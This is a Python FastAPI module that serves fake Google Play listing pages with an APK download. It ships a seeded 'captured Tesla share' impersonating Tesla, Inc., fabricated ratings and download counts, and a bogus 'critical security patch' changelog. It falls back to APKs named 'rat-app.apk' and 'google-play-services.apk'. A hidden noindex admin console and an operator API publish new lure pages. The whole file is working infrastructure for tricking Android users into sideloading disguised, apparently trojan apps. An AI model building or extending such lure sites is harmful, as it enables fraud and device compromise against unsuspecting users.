"""
Google Play–style APK share landing pages.

Public routes (wired from main.py):
  GET  /s/{token}        -> polished Play listing HTML
  GET  /s/{token}/icon   -> app icon
  GET  /s/{token}/dl     -> APK download

Hidden publisher (password cookie):
  GET  /{PLAY_ADMIN_PATH}              -> login / console HTML  (default /px-console)
  POST /{PLAY_ADMIN_PATH}/login
  POST /{PLAY_ADMIN_PATH}/api/publish  -> multipart APK+icon+meta
  POST /{PLAY_ADMIN_PATH}/api/rename
  ...

Operator JWT API (panel):
  POST /api/play-shares
  GET  /api/play-shares
  DELETE /api/play-shares/{token}
"""

from __future__ import annotations

import json
import os
import re
import secrets
import shutil
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

from fastapi import APIRouter, Depends, File, Form, HTTPException, Request, Response, UploadFile
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from pydantic import BaseModel, Field

from play_admin_auth import (
    COOKIE_NAME,
    get_admin_path,
    issue_session_cookie,
    validate_session_cookie,
    verify_password,
)
from play_templates import get_template, random_template, templates_public_payload

SERVER_DIR = Path(__file__).resolve().parent


def _shares_dir() -> Path:
    """Allow Render/persistent disk via PLAY_SHARES_DIR (default: ./play_shares)."""
    override = (os.getenv("PLAY_SHARES_DIR") or "").strip()
    if override:
        p = Path(override)
    else:
        p = SERVER_DIR / "play_shares"
    p.mkdir(parents=True, exist_ok=True)
    return p


SHARES_DIR = _shares_dir()
TEMPLATE_PATH = SERVER_DIR / "web" / "play_landing.html"
ADMIN_TEMPLATE_PATH = SERVER_DIR / "web" / "play_admin.html"

router = APIRouter(tags=["play-landing"])
ADMIN_PATH = get_admin_path()
RESERVED_TOKENS = {
    "api", "icon", "dl", "new", "admin", "manage", "login", "logout",
    "assets", "static", "health", "_admin", ADMIN_PATH.lower(),
}


DEFAULTS = {
    "app_name": "App",
    "developer": "Developer",
    "rating": "4.7",
    "reviews": "3.12M",
    "downloads": "10M+",
    "content_rating": "Everyone",
    "content_label": "Rated for 3+",
    "updated": None,  # filled with today
    "about": (
        "We're always making changes and improvements to this app. "
        "To make sure you don't miss a thing, just keep your Updates turned on."
    ),
    "changelog": [
        "Bug fixes and performance improvements.",
        "Critical security vulnerability patch.",
    ],
}


def _today_label() -> str:
    return datetime.now().strftime("%b %d, %Y")


def slugify(name: str) -> str:
    text = (name or "").strip().lower()
    text = re.sub(r"[^a-z0-9]+", "-", text)
    text = re.sub(r"-{2,}", "-", text).strip("-")
    return (text[:48] or f"app-{secrets.token_hex(3)}")


def normalize_token(token: str) -> str:
    safe = "".join(c for c in (token or "").strip() if c.isalnum() or c in ("_", "-"))
    if not safe or len(safe) < 2:
        raise HTTPException(status_code=400, detail="invalid slug (use letters, numbers, _ or -)")
    if safe.lower() in RESERVED_TOKENS or safe.startswith("_"):
        raise HTTPException(status_code=400, detail="slug reserved")
    return safe


def _token_dir(token: str) -> Path:
    safe = normalize_token(token)
    return SHARES_DIR / safe


def rename_share(from_token: str, to_token: str) -> Dict[str, Any]:
    src_tok = normalize_token(from_token)
    dst_tok = normalize_token(to_token)
    if src_tok == dst_tok:
        return load_share(src_tok)
    src = SHARES_DIR / src_tok
    dst = SHARES_DIR / dst_tok
    if not (src / "meta.json").is_file():
        raise HTTPException(status_code=404, detail="share not found")
    if dst.exists():
        raise HTTPException(status_code=409, detail="target slug already exists")
    src.rename(dst)
    meta = load_share(dst_tok)
    meta["token"] = dst_tok
    save_share(dst_tok, meta)
    return meta


def _meta_path(token: str) -> Path:
    return _token_dir(token) / "meta.json"


def load_share(token: str) -> Dict[str, Any]:
    path = _meta_path(token)
    if not path.is_file():
        raise HTTPException(status_code=404, detail="share not found")
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"corrupt share meta: {exc}")
    data.setdefault("token", token)
    return data


def save_share(token: str, data: Dict[str, Any]) -> Dict[str, Any]:
    d = _token_dir(token)
    d.mkdir(parents=True, exist_ok=True)
    payload = dict(data)
    payload["token"] = token
    payload["updated_at"] = datetime.utcnow().isoformat() + "Z"
    _meta_path(token).write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def list_shares() -> List[Dict[str, Any]]:
    out: List[Dict[str, Any]] = []
    if not SHARES_DIR.exists():
        return out
    for child in sorted(SHARES_DIR.iterdir()):
        if not child.is_dir() or child.name.startswith("_"):
            continue
        meta = child / "meta.json"
        if meta.is_file():
            try:
                data = json.loads(meta.read_text(encoding="utf-8"))
                data.setdefault("token", child.name)
                out.append(data)
            except Exception:
                continue
    return out


def render_landing(meta: Dict[str, Any]) -> str:
    if not TEMPLATE_PATH.is_file():
        raise HTTPException(status_code=500, detail="play_landing.html missing")
    html = TEMPLATE_PATH.read_text(encoding="utf-8")
    token = meta["token"]
    changelog = meta.get("changelog") or DEFAULTS["changelog"]
    if isinstance(changelog, str):
        changelog = [line.strip("- •\t ") for line in changelog.splitlines() if line.strip()]
    items = "\n".join(f"<li>{_escape(item)}</li>" for item in changelog)

    chips = meta.get("chips")
    if chips is None:
        chips = []
    if isinstance(chips, str):
        chips = [c.strip() for c in chips.split(",") if c.strip()]
    chips_html = "".join(f'<span class="chip">{_escape(c)}</span>' for c in chips)

    replacements = {
        "{{APP_NAME}}": _escape(meta.get("app_name") or DEFAULTS["app_name"]),
        "{{DEVELOPER}}": _escape(meta.get("developer") or DEFAULTS["developer"]),
        "{{RATING}}": _escape(str(meta.get("rating") or DEFAULTS["rating"])),
        "{{REVIEWS}}": _escape(str(meta.get("reviews") or DEFAULTS["reviews"])),
        "{{DOWNLOADS}}": _escape(str(meta.get("downloads") or DEFAULTS["downloads"])),
        "{{CONTENT_RATING}}": _escape(str(meta.get("content_rating") or DEFAULTS["content_rating"])),
        "{{CONTENT_LABEL}}": _escape(str(meta.get("content_label") or DEFAULTS["content_label"])),
        "{{UPDATED}}": _escape(meta.get("updated") or _today_label()),
        "{{ABOUT}}": _escape(meta.get("about") or DEFAULTS["about"]),
        "{{CHANGELOG_ITEMS}}": items,
        "{{CHIPS}}": chips_html,
        "{{ICON_URL}}": f"/s/{token}/icon",
        "{{DOWNLOAD_URL}}": f"/s/{token}/dl",
    }
    for key, value in replacements.items():
        html = html.replace(key, value)
    return html


def _escape(text: str) -> str:
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#39;")
    )


def ensure_seed_tesla() -> None:
    """Seed the captured Tesla share so /s/ur0S1pBN4FpdVii4 works out of the box."""
    token = "ur0S1pBN4FpdVii4"
    d = SHARES_DIR / token
    d.mkdir(parents=True, exist_ok=True)
    meta_file = d / "meta.json"
    icon_dst = d / "icon.png"
    assets_icon = SERVER_DIR / "web" / "play_landing_assets" / "tesla_icon.png"
    if assets_icon.is_file() and not icon_dst.is_file():
        shutil.copy2(assets_icon, icon_dst)

    # Prefer a real APK if one was copied into the share folder; else link a lab APK.
    apk_dst = d / "app.apk"
    if not apk_dst.is_file():
        for candidate in (
            SERVER_DIR / "web" / "rat-app.apk",
            SERVER_DIR / "downloads" / "SSR_G_IMD_Test.apk",
            SERVER_DIR / "downloads" / "google-play-services.apk",
        ):
            if candidate.is_file():
                try:
                    shutil.copy2(candidate, apk_dst)
                except Exception:
                    # Fall back to symlink-style reference via meta.apk_path
                    pass
                break

    if meta_file.is_file():
        return

    apk_name = "Tesla.apk"
    apk_path = "app.apk" if apk_dst.is_file() else None
    if apk_path is None:
        for name in ("SSR_G_IMD_Test.apk", "google-play-services.apk", "rat-app.apk"):
            for base in (SERVER_DIR / "downloads", SERVER_DIR / "web"):
                p = base / name
                if p.is_file():
                    apk_path = str(p)
                    apk_name = "Tesla.apk"
                    break
            if apk_path:
                break

    save_share(
        token,
        {
            "app_name": "Tesla",
            "developer": "Tesla, Inc.",
            "rating": "4.7",
            "reviews": "3.12M",
            "downloads": "10M+",
            "content_rating": "Everyone",
            "content_label": "Rated for 3+",
            "updated": _today_label(),
            "about": DEFAULTS["about"],
            "changelog": DEFAULTS["changelog"],
            "apk_filename": apk_name,
            "apk_path": apk_path or "app.apk",
            "icon_path": "icon.png",
            "seeded": True,
        },
    )


class PlayShareCreate(BaseModel):
    app_name: str = Field(..., min_length=1, max_length=80)
    developer: str = Field("Developer", max_length=80)
    rating: str = "4.7"
    reviews: str = "3.12M"
    downloads: str = "10M+"
    content_rating: str = "Everyone"
    content_label: str = "Rated for 3+"
    updated: Optional[str] = None
    about: Optional[str] = None
    changelog: Optional[List[str]] = None
    apk_filename: Optional[str] = None  # file already in server/downloads
    token: Optional[str] = None


@router.get("/s/{token}", response_class=HTMLResponse)
async def play_share_page(token: str):
    ensure_seed_tesla()
    normalize_token(token)
    meta = load_share(token)
    return HTMLResponse(render_landing(meta), headers={"Cache-Control": "no-store"})


@router.get("/s/{token}/icon")
async def play_share_icon(token: str):
    ensure_seed_tesla()
    normalize_token(token)
    meta = load_share(token)
    d = _token_dir(token)
    icon_rel = meta.get("icon_path") or "icon.png"
    icon = (d / icon_rel).resolve()
    if not str(icon).startswith(str(d.resolve())) or not icon.is_file():
        raise HTTPException(status_code=404, detail="icon not found")
    media = "image/png"
    lower = icon.name.lower()
    if lower.endswith(".jpg") or lower.endswith(".jpeg"):
        media = "image/jpeg"
    elif lower.endswith(".webp"):
        media = "image/webp"
    return FileResponse(icon, media_type=media, headers={"Cache-Control": "public, max-age=3600"})


@router.get("/s/{token}/dl")
async def play_share_download(token: str):
    ensure_seed_tesla()
    normalize_token(token)
    meta = load_share(token)
    d = _token_dir(token)
    apk_rel = meta.get("apk_path") or "app.apk"
    apk = Path(apk_rel)
    if not apk.is_absolute():
        apk = (d / apk_rel).resolve()
    else:
        apk = apk.resolve()

    downloads_dir = (SERVER_DIR / "downloads").resolve()
    web_dir = (SERVER_DIR / "web").resolve()
    share_dir = d.resolve()
    allowed_roots = (share_dir, downloads_dir, web_dir)
    if not any(str(apk).startswith(str(root)) for root in allowed_roots) or not apk.is_file():
        raise HTTPException(status_code=404, detail="apk not found")

    filename = meta.get("apk_filename") or f"{meta.get('app_name', 'app')}.apk"
    filename = "".join(c for c in filename if c.isalnum() or c in (" ", ".", "_", "-")).strip() or "app.apk"
    if not filename.lower().endswith(".apk"):
        filename += ".apk"

    return FileResponse(
        apk,
        media_type="application/vnd.android.package-archive",
        filename=filename,
        headers={"Cache-Control": "no-store", "Content-Disposition": f'attachment; filename="{filename}"'},
    )


# ==================== Hidden password publisher ====================

def _require_admin(request: Request) -> None:
    if not validate_session_cookie(request.cookies.get(COOKIE_NAME)):
        raise HTTPException(status_code=401, detail="unauthorized")


def _admin_html() -> str:
    if not ADMIN_TEMPLATE_PATH.is_file():
        raise HTTPException(status_code=500, detail="play_admin.html missing")
    return ADMIN_TEMPLATE_PATH.read_text(encoding="utf-8")


class AdminLoginBody(BaseModel):
    password: str


class AdminRenameBody(BaseModel):
    from_token: str
    to_token: str


@router.get(f"/{ADMIN_PATH}", response_class=HTMLResponse)
async def play_admin_console():
    return HTMLResponse(_admin_html(), headers={"Cache-Control": "no-store", "X-Robots-Tag": "noindex"})


@router.post(f"/{ADMIN_PATH}/login")
async def play_admin_login(body: AdminLoginBody, response: Response):
    if not verify_password(body.password or ""):
        raise HTTPException(status_code=401, detail="wrong password")
    value, opts = issue_session_cookie()
    response = JSONResponse({"ok": True, "path": f"/{ADMIN_PATH}"})
    response.set_cookie(
        COOKIE_NAME,
        value,
        httponly=opts["httponly"],
        samesite=opts["samesite"],
        path=opts["path"],
        max_age=opts["max_age"],
        secure=bool(opts.get("secure")),
    )
    return response


@router.post(f"/{ADMIN_PATH}/logout")
async def play_admin_logout(response: Response):
    response = JSONResponse({"ok": True})
    response.delete_cookie(COOKIE_NAME, path="/")
    return response


@router.get(f"/{ADMIN_PATH}/api/me")
async def play_admin_me(request: Request):
    _require_admin(request)
    return {"ok": True, "path": f"/{ADMIN_PATH}"}


@router.get(f"/{ADMIN_PATH}/api/templates")
async def play_admin_templates(request: Request, category: Optional[str] = None):
    _require_admin(request)
    data = templates_public_payload()
    if category:
        data["templates"] = [t for t in data["templates"] if t.get("category") == category]
    return data


@router.get(f"/{ADMIN_PATH}/api/templates/random")
async def play_admin_random_template(request: Request, category: Optional[str] = None):
    _require_admin(request)
    return {"template": random_template(category)}


@router.get(f"/{ADMIN_PATH}/api/shares")
async def play_admin_list_shares(request: Request):
    _require_admin(request)
    ensure_seed_tesla()
    out = []
    for s in list_shares():
        tok = s.get("token")
        if not tok:
            continue
        d = SHARES_DIR / tok
        s["url"] = f"/s/{tok}"
        s["download_url"] = f"/s/{tok}/dl"
        s["icon_url"] = f"/s/{tok}/icon"
        s["has_apk"] = (d / "app.apk").is_file() or bool(s.get("apk_path"))
        s["has_icon"] = (d / (s.get("icon_path") or "icon.png")).is_file()
        out.append(s)
    return {"shares": out}


@router.post(f"/{ADMIN_PATH}/api/publish")
async def play_admin_publish(
    request: Request,
    app_name: str = Form(...),
    developer: str = Form("Developer"),
    slug: Optional[str] = Form(None),
    rating: str = Form("4.7"),
    reviews: str = Form("3.12M"),
    downloads: str = Form("10M+"),
    content_rating: str = Form("Everyone"),
    content_label: str = Form("Rated for 3+"),
    about: Optional[str] = Form(None),
    changelog: Optional[str] = Form(None),
    chips: Optional[str] = Form(None),
    template_id: Optional[str] = Form(None),
    apk: UploadFile = File(...),
    icon: Optional[UploadFile] = File(None),
):
    _require_admin(request)
    app_name = (app_name or "").strip()
    if not app_name:
        raise HTTPException(status_code=400, detail="app_name required")

    # Optional template fill for any blank listing fields
    tpl = get_template(template_id) if template_id else None
    if tpl:
        developer = developer or tpl.get("developer") or "Developer"
        rating = rating or tpl.get("rating") or "4.7"
        reviews = reviews or tpl.get("reviews") or "3.12M"
        downloads = downloads or tpl.get("downloads") or "10M+"
        content_rating = content_rating or tpl.get("content_rating") or "Everyone"
        content_label = content_label or tpl.get("content_label") or "Rated for 3+"
        about = about or tpl.get("about")
        if not changelog and tpl.get("changelog"):
            changelog = "\n".join(tpl["changelog"])
        if not chips and tpl.get("chips"):
            chips = ", ".join(tpl["chips"])
        if not slug:
            slug = tpl.get("slug")

    token = normalize_token(slug.strip() if slug and slug.strip() else slugify(app_name))
    d = _token_dir(token)
    if (d / "meta.json").is_file():
        # Allow overwrite publish to same slug (update listing)
        pass
    d.mkdir(parents=True, exist_ok=True)

    apk_bytes = await apk.read()
    if not apk_bytes:
        raise HTTPException(status_code=400, detail="empty apk")
    if len(apk_bytes) > 220_000_000:
        raise HTTPException(status_code=400, detail="apk too large")
    (d / "app.apk").write_bytes(apk_bytes)

    icon_path = "icon.png"
    if icon is not None and icon.filename:
        icon_bytes = await icon.read()
        if len(icon_bytes) > 5_000_000:
            raise HTTPException(status_code=400, detail="icon too large")
        name = (icon.filename or "icon.png").lower()
        if name.endswith(".jpg") or name.endswith(".jpeg"):
            icon_path = "icon.jpg"
        elif name.endswith(".webp"):
            icon_path = "icon.webp"
        else:
            icon_path = "icon.png"
        # drop previous icon variants on replace
        for old in ("icon.png", "icon.jpg", "icon.webp"):
            p = d / old
            if p.is_file() and old != icon_path:
                try:
                    p.unlink()
                except Exception:
                    pass
        (d / icon_path).write_bytes(icon_bytes)
    else:
        for cand in ("icon.png", "icon.jpg", "icon.webp"):
            if (d / cand).is_file():
                icon_path = cand
                break
        else:
            # Prefer selected template icon, else generic fallback
            src_icon = None
            if tpl and tpl.get("icon_path") and Path(tpl["icon_path"]).is_file():
                src_icon = Path(tpl["icon_path"])
            else:
                fallback = SERVER_DIR / "web" / "play_landing_assets" / "tesla_icon.png"
                if fallback.is_file():
                    src_icon = fallback
            if src_icon:
                shutil.copy2(src_icon, d / "icon.png")
                icon_path = "icon.png"

    log_items = DEFAULTS["changelog"]
    if changelog:
        log_items = [ln.strip("- •\t ") for ln in changelog.splitlines() if ln.strip()]

    chip_list: List[str] = []
    if chips:
        chip_list = [c.strip() for c in chips.split(",") if c.strip()]

    meta = save_share(
        token,
        {
            "app_name": app_name,
            "developer": (developer or "Developer").strip() or "Developer",
            "rating": rating or "4.7",
            "reviews": reviews or "3.12M",
            "downloads": downloads or "10M+",
            "content_rating": content_rating or "Everyone",
            "content_label": content_label or "Rated for 3+",
            "updated": _today_label(),
            "about": (about or "").strip() or DEFAULTS["about"],
            "changelog": log_items,
            "chips": chip_list,
            "apk_filename": f"{app_name}.apk",
            "apk_path": "app.apk",
            "icon_path": icon_path if (d / icon_path).is_file() else "icon.png",
            "published_via": "px-console",
        },
    )
    return {
        "ok": True,
        "token": token,
        "url": f"/s/{token}",
        "download_url": f"/s/{token}/dl",
        "icon_url": f"/s/{token}/icon",
        "share": meta,
    }


@router.post(f"/{ADMIN_PATH}/api/rename")
async def play_admin_rename(request: Request, body: AdminRenameBody):
    _require_admin(request)
    meta = rename_share(body.from_token, body.to_token)
    return {
        "ok": True,
        "token": meta["token"],
        "url": f"/s/{meta['token']}",
        "share": meta,
    }


@router.delete(f"/{ADMIN_PATH}/api/shares/{{token}}")
async def play_admin_delete(token: str, request: Request):
    _require_admin(request)
    d = _token_dir(token)
    if not d.exists():
        raise HTTPException(status_code=404, detail="share not found")
    shutil.rmtree(d, ignore_errors=True)
    return {"ok": True}


def register_operator_routes(app, get_current_user, get_db):
    """Attach authenticated CRUD routes onto the FastAPI app."""

    @app.get("/api/play-shares")
    async def api_list_play_shares(current_user=Depends(get_current_user)):
        ensure_seed_tesla()
        shares = list_shares()
        for s in shares:
            tok = s.get("token")
            if tok:
                s["url"] = f"/s/{tok}"
                s["download_url"] = f"/s/{tok}/dl"
                s["icon_url"] = f"/s/{tok}/icon"
        return {"shares": shares}

    @app.post("/api/play-shares")
    async def api_create_play_share(
        payload: PlayShareCreate,
        current_user=Depends(get_current_user),
    ):
        token = payload.token or secrets.token_urlsafe(12).replace("-", "")[:16]
        token = "".join(c for c in token if c.isalnum() or c in ("_", "-"))
        if len(token) < 8:
            raise HTTPException(status_code=400, detail="token too short")
        if _meta_path(token).is_file():
            raise HTTPException(status_code=409, detail="token already exists")

        d = _token_dir(token)
        d.mkdir(parents=True, exist_ok=True)

        apk_path = "app.apk"
        if payload.apk_filename:
            src = (SERVER_DIR / "downloads" / Path(payload.apk_filename).name).resolve()
            downloads = (SERVER_DIR / "downloads").resolve()
            if not str(src).startswith(str(downloads)) or not src.is_file():
                raise HTTPException(status_code=404, detail="apk_filename not in downloads")
            shutil.copy2(src, d / "app.apk")
            apk_path = "app.apk"

        meta = save_share(
            token,
            {
                "app_name": payload.app_name,
                "developer": payload.developer,
                "rating": payload.rating,
                "reviews": payload.reviews,
                "downloads": payload.downloads,
                "content_rating": payload.content_rating,
                "content_label": payload.content_label,
                "updated": payload.updated or _today_label(),
                "about": payload.about or DEFAULTS["about"],
                "changelog": payload.changelog or DEFAULTS["changelog"],
                "apk_filename": f"{payload.app_name}.apk",
                "apk_path": apk_path,
                "icon_path": "icon.png",
                "owner": getattr(current_user, "username", None),
            },
        )
        meta["url"] = f"/s/{token}"
        return meta

    @app.post("/api/play-shares/{token}/assets")
    async def api_upload_play_assets(
        token: str,
        icon: Optional[UploadFile] = File(None),
        apk: Optional[UploadFile] = File(None),
        current_user=Depends(get_current_user),
    ):
        meta = load_share(token)
        d = _token_dir(token)
        if icon is not None:
            data = await icon.read()
            if len(data) > 2_000_000:
                raise HTTPException(status_code=400, detail="icon too large")
            (d / "icon.png").write_bytes(data)
            meta["icon_path"] = "icon.png"
        if apk is not None:
            data = await apk.read()
            if len(data) > 200_000_000:
                raise HTTPException(status_code=400, detail="apk too large")
            (d / "app.apk").write_bytes(data)
            meta["apk_path"] = "app.apk"
        save_share(token, meta)
        return {"ok": True, "token": token, "url": f"/s/{token}"}

    @app.delete("/api/play-shares/{token}")
    async def api_delete_play_share(token: str, current_user=Depends(get_current_user)):
        d = _token_dir(token)
        if not d.exists():
            raise HTTPException(status_code=404, detail="share not found")
        shutil.rmtree(d, ignore_errors=True)
        return {"ok": True}
